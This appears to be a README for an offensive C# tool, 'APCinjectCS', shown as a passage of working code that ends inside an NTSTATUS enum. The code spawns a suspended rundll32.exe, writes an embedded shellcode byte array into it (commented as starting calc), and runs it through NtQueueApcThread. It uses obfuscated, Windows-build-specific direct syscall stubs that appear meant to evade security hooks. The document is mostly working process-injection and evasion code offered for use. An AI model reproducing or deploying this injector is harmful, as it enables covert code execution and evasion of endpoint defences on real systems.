# APCinjectCS
Simple shellcode injetion with APC and syscalls

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;


public class Code
{

    public static void exec() // .DLL Entrypoint
    {
          // scode = start calc
          byte[] scode = new byte[275] {  72,131,228,240,232,192,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,139,128,136,0,0,0,72,133,192,116,103,72,1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,87,255,255,255,93,72,186,1,0,0,0,0,0,0,0,72,141,141,1,1,0,0,65,186,49,139,111,135,255,213,187,224,29,42,10,65,186,166,149,189,157,255,213,72,131,196,40,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,89,65,137,218,255,213,99,97,108,99,46,101,120,101,0 };
          STARTUPINFO si = new STARTUPINFO();
          si.dwFlags = 0x00000001;
          PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
          bool CreateProcessResult = CreateProcessA("C:\\Windows\\System32\\rundll32.exe", null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);
          IntPtr VirtualAllocExResult = new IntPtr();
          IntPtr scodeSize = (IntPtr)(Int32)scode.Length;
          NtAllocateVirtualMemory(pi.hProcess, ref VirtualAllocExResult, new IntPtr(0), ref scodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          IntPtr byteWritten = IntPtr.Zero;
          IntPtr unmanagedPointer = Marshal.AllocHGlobal(scode.Length);
          Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);
          NtWriteVirtualMemory(pi.hProcess, ref VirtualAllocExResult, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
          Marshal.FreeHGlobal(unmanagedPointer);
          MemoryProtection OldProtect;
          NtProtectVirtualMemory( pi.hProcess, ref VirtualAllocExResult, ref scodeSize, MemoryProtection.ExecuteRead, out OldProtect );
          IntPtr ptrToHandle = (IntPtr)pi.hThread;
          NtQueueApcThread(ptrToHandle, VirtualAllocExResult);
          ulong SuspendCount;
          NtResumeThread((IntPtr)pi.hThread, out SuspendCount);
    } // exec()

    public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
    {
        var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
        var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
        NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
        // Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004
        if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
            {
            // NtOpenProcess
            if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtCreateThreadEx
            if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtWriteVirtualMemory
            if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtAllocateVirtualMemory
            if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtCreateSection
            if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtMapViewOfSection
            if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtCreateProcess
            if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtOpenThread
            if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
            // NtResumeThread
            if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtWaitForSingleObject
            if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtSetContextThread
            if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
            // NtGetContextThread
            if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtReadVirtualMemory
            if (sysType == 13) { syscall[4] = 064; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtClose
            if (sysType == 14) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtQueueApcThread
            if (sysType == 15) { syscall[4] = 070; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
            // NtOpenProcessToken
            if (sysType == 16) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); }
            } else
              if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
                  {
                  // NtOpenProcess
                  if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtCreateThreadEx
                  if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtWriteVirtualMemory
                  if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtAllocateVirtualMemory
                  if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtCreateSection
                  if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtMapViewOfSection
                  if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtCreateProcess
                  if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtOpenThread
                  if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // NtResumeThread
                  if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtWaitForSingleObject
                  if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtSetContextThread
                  if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // NtGetContextThread
                  if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtReadVirtualMemory
                  if (sysType == 13) { syscall[4] = 064; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtClose
                  if (sysType == 14) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtQueueApcThread
                  if (sysType == 15) { syscall[4] = 070; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // NtOpenProcessToken
                  if (sysType == 16) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x123); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));  }
                  } else
                    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                        {
                        // NtOpenProcess
                        if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtCreateThreadEx
                        if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtWriteVirtualMemory
                        if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtAllocateVirtualMemory
                        if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtCreateSection
                        if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtMapViewOfSection
                        if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtCreateProcess
                        if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtOpenThread
                        if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                        // NtResumeThread
                        if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtWaitForSingleObject
                        if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtSetContextThread
                        if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                        // NtGetContextThread
                        if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtReadVirtualMemory
                        if (sysType == 13) { syscall[4] = 064; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtClose
                        if (sysType == 14) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtQueueApcThread
                        if (sysType == 15) { syscall[4] = 070; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                        // NtOpenProcessToken
                        if (sysType == 16) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x121); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));  }
                        } else
                          if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                              {
                              // NtOpenProcess
                              if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtCreateThreadEx
                              if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtWriteVirtualMemory
                              if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtAllocateVirtualMemory
                              if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtCreateSection
                              if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtMapViewOfSection
                              if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtCreateProcess
                              if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtOpenThread
                              if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // NtResumeThread
                              if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtWaitForSingleObject
                              if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtSetContextThread
                              if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                              // NtGetContextThread
                              if (sysType == 12) { syscall[4] = 237; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtReadVirtualMemory
                              if (sysType == 13) { syscall[4] = 064; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtClose
                              if (sysType == 14) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtQueueApcThread
                              if (sysType == 15) { syscall[4] = 070; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                              // NtOpenProcessToken
                              if (sysType == 16) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x122); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint));  }
                              } // 1809
                              return syscall;
    }


    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtQueueApcThreadX(IntPtr ProcessHandle, IntPtr BaseAddress);

    	public static NTSTATUS NtQueueApcThread(IntPtr ProcessHandle, IntPtr BaseAddress)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 15 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtQueueApcThreadX NtQueueApcThreadFunc = (NtQueueApcThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtQueueApcThreadX));
    							return (NTSTATUS)NtQueueApcThreadFunc(ProcessHandle, BaseAddress);
    					}
    			}
    	}


    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, ulong AllocationType, ulong Protect );

    	public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, ulong AllocationType, ulong Protect)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtAllocateVirtualMemoryX NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtAllocateVirtualMemoryX));
    							return (NTSTATUS)NtAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
    					}
    			}
    	}

    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

    	public static NTSTATUS NtWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtWriteVirtualMemoryX NtWriteVirtualMemoryFunc = (NtWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtWriteVirtualMemoryX));
    							return (NTSTATUS)NtWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
    					}
    			}
    	}

    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtOpenThreadX( out IntPtr threadHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid );

    	public static NTSTATUS NtOpenThread( out IntPtr threadHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 8 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtOpenThreadX NtOpenThreadFunc = (NtOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtOpenThreadX));
    							return (NTSTATUS)NtOpenThreadFunc( out threadHandle, processAccess, objAttribute, ref clientid);
    					}

    			}
    	}

    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtCloseX( IntPtr ObjectHandle);

    	public static NTSTATUS NtClose( IntPtr threadHandle)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 14 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtCloseX NtCloseFunc = (NtCloseX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCloseX));
    							return (NTSTATUS)NtCloseFunc(threadHandle);
    					}

    			}
    	}

    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS NtResumeThreadX( IntPtr threadHandle, out ulong SuspendCount );

    	public static NTSTATUS NtResumeThread( IntPtr threadHandle, out ulong SuspendCount)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtResumeThreadX NtResumeThreadFunc = (NtResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtResumeThreadX));
    							return (NTSTATUS)NtResumeThreadFunc(threadHandle, out SuspendCount);
    					}

    			}
    	}

    	[SuppressUnmanagedCodeSecurity]
    	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    	public delegate NTSTATUS  NtOpenProcessTokenX(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

    	public static NTSTATUS NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle)
    	{
    			byte [] syscall = GetOSVersionAndReturnSyscall( 16 );
    			unsafe
    			{
    					fixed (byte* ptr = syscall)
    					{
    							IntPtr allocMemAddress = (IntPtr)ptr;
    							IntPtr allocMemAddressCopy = (IntPtr)ptr;
    							MemoryProtection oldProtection;
    							uint size = (uint)syscall.Length;
    							IntPtr sizeIntPtr = (IntPtr)size;
    							NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
    							NtOpenProcessTokenX NtOpenProcessTokenFunc = (NtOpenProcessTokenX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtOpenProcessTokenX));
    							return (NTSTATUS)NtOpenProcessTokenFunc(ProcessHandle, DesiredAccess, ref TokenHandle);
    					}

    			}
    	}

      [SuppressUnmanagedCodeSecurity]
      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate NTSTATUS NtWaitForSingleObjectX( IntPtr Object, bool Alertable, uint Timeout );
      public static NTSTATUS NtWaitForSingleObject( IntPtr Object, bool Alertable, uint Timeout )
      {
          byte [] syscall = GetOSVersionAndReturnSyscall( 10 );
          unsafe
          {
              fixed (byte* ptr = syscall)
              {
                  IntPtr allocMemAddress = (IntPtr)ptr;
                  IntPtr allocMemAddressCopy = (IntPtr)ptr;
                  MemoryProtection oldProtection;
                  uint size = (uint)syscall.Length;
                  IntPtr sizeIntPtr = (IntPtr)size;
                  NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                  NtWaitForSingleObjectX NtWaitForSingleObjectFunc = (NtWaitForSingleObjectX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtWaitForSingleObjectX));
                  return (NTSTATUS)NtWaitForSingleObject(Object, Alertable, Timeout);
              }

          }
      }


      [DllImport("kernel32.dll", EntryPoint = "CreateProcessA" )]
      public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

      [SuppressUnmanagedCodeSecurity]
      [DllImport("ntdll.dll", SetLastError = true)]
      private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

      [DllImport("ntdll.dll")]
      public static extern NTSTATUS NtProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );


      public enum NTSTATUS : uint
      {
          Success = 0x00000000,
          Wait0 = 0x00000000,
          Wait1 = 0x00000001,
          Wait2 = 0x00000002,
          Wait3 = 0x00000003,
          Wait63 = 0x0000003f,
          Abandoned = 0x00000080,
          AbandonedWait0 = 0x00000080,
          AbandonedWait1 = 0x00000081,
          AbandonedWait2 = 0x00000082,
          AbandonedWait3 = 0x00000083,
          AbandonedWait63 = 0x000000bf,
          UserApc = 0x000000c0,
          KernelApc = 0x00000100,
          Alerted = 0x00000101,
          Timeout = 0x00000102,
          Pending = 0x00000103,
          Reparse = 0x00000104,
          MoreEntries = 0x00000105,
          NotAllAssigned = 0x00000106,
          SomeNotMapped = 0x00000107,
          OpLockBreakInProgress = 0x00000108,
          VolumeMounted = 0x00000109,
          RxActCommitted = 0x0000010a,
          NotifyCleanup = 0x0000010b,
          NotifyEnumDir = 0x0000010c,
          NoQuotasForAccount = 0x0000010d,
          PrimaryTransportConnectFailed = 0x0000010e,
          PageFaultTransition = 0x00000110,
          PageFaultDemandZero = 0x00000111,
          PageFaultCopyOnWrite = 0x00000112,
          PageFaultGuardPage = 0x00000113,
          PageFaultPagingFile = 0x00000114,
          CrashDump = 0x00000116,
          ReparseObject = 0x00000118,
          NothingToTerminate = 0x00000122,
          ProcessNotInJob = 0x00000123,
          ProcessInJob = 0x00000124,
          ProcessCloned = 0x00000129,
          FileLockedWithOnlyReaders = 0x0000012a,
          FileLockedWithWriters = 0x0000012b,
          Informational = 0x40000000,
          ObjectNameExists = 0x40000000,
          ThreadWasSuspended = 0x40000001,
          WorkingSetLimitRange = 0x40000002,
          ImageNotAtBase = 0x40000003,
          RegistryRecovered = 0x40000009,
          Warning = 0x80000000,
          GuardPageViolation = 0x80000001,
          DatatypeMisalignment = 0x80000002,
          Breakpoint = 0x80000003,
          SingleStep = 0x80000004,
          BufferOverflow = 0x80000005,
          NoMoreFiles = 0x80000006,
          HandlesClosed = 0x8000000a,
          PartialCopy = 0x8000000d,
          DeviceBusy = 0x80000011,
          InvalidEaName = 0x80000013,
          EaListInconsistent = 0x80000014,
          NoMoreEntries = 0x8000001a,
          LongJump = 0x80000026,
          DllMightBeInsecure = 0x8000002b,
          Error = 0xc0000000,
          Unsuccessful = 0xc0000001,
          NotImplemented = 0xc0000002,
          InvalidInfoClass = 0xc0000003,
          InfoLengthMismatch = 0xc0000004,
          AccessViolation = 0xc0000005,
          InPageError = 0xc0000006,
          PagefileQuota = 0xc0000007,
          InvalidHandle = 0xc0000008,
          BadInitialStack = 0xc0000009,
          BadInitialPc = 0xc000000a,
          InvalidCid = 0xc000000b,
          TimerNotCanceled = 0xc000000c,
          InvalidParameter = 0xc000000d,
          NoSuchDevice = 0xc000000e,
          NoSuchFile = 0xc000000f,
          InvalidDeviceRequest = 0xc0000010,
          EndOfFile = 0xc0000011,
          WrongVolume = 0xc0000012,
          NoMediaInDevice = 0xc0000013,
          NoMemory = 0xc0000017,
          ConflictingAddresses = 0xc0000018,
          NotMappedView = 0xc0000019,
          UnableToFreeVm = 0xc000001a,
          UnableToDeleteSection = 0xc000001b,
          IllegalInstruction = 0xc000001d,
          AlreadyCommitted = 0xc0000021,
          AccessDenied = 0xc0000022,
          BufferTooSmall = 0xc0000023,
          ObjectTypeMismatch = 0xc0000024,
          NonContinuableException = 0xc0000025,
          BadStack = 0xc0000028,
          NotLocked = 0xc000002a,
          NotCommitted = 0xc000002d,
          InvalidParameterMix = 0xc0000030,
          ObjectNameInvalid = 0xc0000033,
          ObjectNameNotFound = 0xc0000034,
          ObjectNameCollision = 0xc0000035,
          ObjectPathInvalid = 0xc0000039,
          ObjectPathNotFound = 0xc000003a,
          ObjectPathSyntaxBad = 0xc000003b,
          DataOverrun = 0xc000003c,
          DataLate = 0xc000003d,
          DataError = 0xc000003e,
          CrcError = 0xc000003f,
          SectionTooBig = 0xc0000040,
          PortConnectionRefused = 0xc0000041,
          InvalidPortHandle = 0xc0000042,
          SharingViolation = 0xc0000043,
          QuotaExceeded = 0xc0000044,
          InvalidPageProtection = 0xc0000045,
          MutantNotOwned = 0xc0000046,
          SemaphoreLimitExceeded = 0xc0000047,
          PortAlreadySet = 0xc0000048,
          SectionNotImage = 0xc0000049,
          SuspendCountExceeded = 0xc000004a,
          ThreadIsTerminating = 0xc000004b,
          BadWorkingSetLimit = 0xc000004c,
          IncompatibleFileMap = 0xc000004d,
          SectionProtection = 0xc000004e,
          EasNotSupported = 0xc000004f,
          EaTooLarge = 0xc0000050,
          NonExistentEaEntry = 0xc0000051,
          NoEasOnFile = 0xc0000052,
          EaCorruptError = 0xc0000053,
          FileLockConflict = 0xc0000054,
          LockNotGranted = 0xc0000055,
          DeletePending = 0xc0000056,
          CtlFileNotSupported = 0xc0000057,
          UnknownRevision = 0xc0000058,
          RevisionMismatch = 0xc0000059,
          InvalidOwner = 0xc000005a,
          InvalidPrimaryGroup = 0xc000005b,
          NoImpersonationToken = 0xc000005c,
          CantDisableMandatory = 0xc000005d,
          NoLogonServers = 0xc000005e,
          NoSuchLogonSession = 0xc000005f,
          NoSuchPrivilege = 0xc0000060,
          PrivilegeNotHeld = 0xc0000061,
